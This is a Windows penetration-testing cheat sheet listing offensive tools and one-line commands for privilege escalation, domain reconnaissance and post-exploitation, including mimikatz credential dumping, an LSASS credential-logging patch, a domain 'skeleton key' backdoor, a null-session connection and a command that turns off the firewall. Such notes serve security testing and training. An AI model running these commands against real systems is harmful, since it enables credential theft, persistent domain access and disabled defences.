# WINDOWS

* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - collection of powershell modules for pentesting
* [Nishang](https://github.com/samratashok/nishang) - Powershell framework and collection of scripts and payloads for pentesting
* [USBDumper](http://www.secuobs.com/USBDumper.rar) - silently copies contents of every connected USB device to the system
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - a swiss army knife for pentesting Windows/Active Directory environments
* [Kon-Boot](http://www.piotrbania.com/all/kon-boot/) - silently bypass the authentication process of Windows based OS

Privilege Escalation
--------------------

* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
* [AccessEnum](https://technet.microsoft.com/en-us/sysinternals/bb897332.aspx) - tool for analyzing files/dirs user rights
* [Autoruns](http://technet.microsoft.com/en-us/sysinternals/bb963902.aspx ) - tool for managing autorun apps
* [AccessChk](https://technet.microsoft.com/en-us/sysinternals/bb664922.aspx)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) - clearinghouse of common Windows privesc vectors that rely on misconfigurations
* `whoami /groups` shows info about which groups you are in, which integrity level your process is run at

Post-Exploitation
-----------------

* [Post-Exploitation with "Incognito"](http://hardsec.net/post-exploitation-with-incognito/?lang=en)
* [PowerShellEmpire](https://github.com/powershellempire/empire) - post-exploitation agent  

If have DC access, use CrackMapExe module to extract ntds.dit (contains AD data) and other modules.  

* [mimikatz](https://github.com/gentilkiwi/mimikatz) - extract plaintext passwords, hashes, PIN codes, kerberos tickets from memory; pass-the-hash. Useful commands:  
`!lsadum::cache` - dump cached credentials  
`!lsadump:sam` - dump local user account password hashes  
`misc::cmd` - re-enable command shell, if disabled in registry  
`!misc::memssp` - patch LSASS to log credentials after authentication; see: c:\windows\system32\mimilsa.log  
`misc::skeleton` - (for DCs only) patch LSASS to make "mimikatz" password work for all users on the domain  
`process::suspend [pid]` - suspend a process  
`process::resume [pid]` - resume execution of a progress  

Windows commands:  

`net view /DOMAIN` - find out which domain I trust  
`net view /DOMAIN:[domain]  
net group "domain computers" /DOMAIN` - see which hosts are in a domain  
`nltest /dclist:[domain]` - see which hosts are DCs for a domain  
`nslookup [name]  
ping -n 1 -4 [name]` - map a NetBIOS name to an IPv4 addresses  
`nltest /domain_trusts  
nltest /server:[address] /domain_trusts` - map domain trusts  
`net view \\[name]` - list shares on a host  
`net group "enterprise admins" /DOMAIN` - show ent admins  
`net group "domain admins" /DOMAIN` - show domain admins  
`net localgroup "administrators" /DOMAIN` - show local admins  

Null Session
------------

Open ports? UDP 137 & 138, TCP 139  
`net use \\host\IPC$ "" "/user:"`

Other
-----

Turn off firewall: `NetSh Advfirewall set allprofiles state off`  
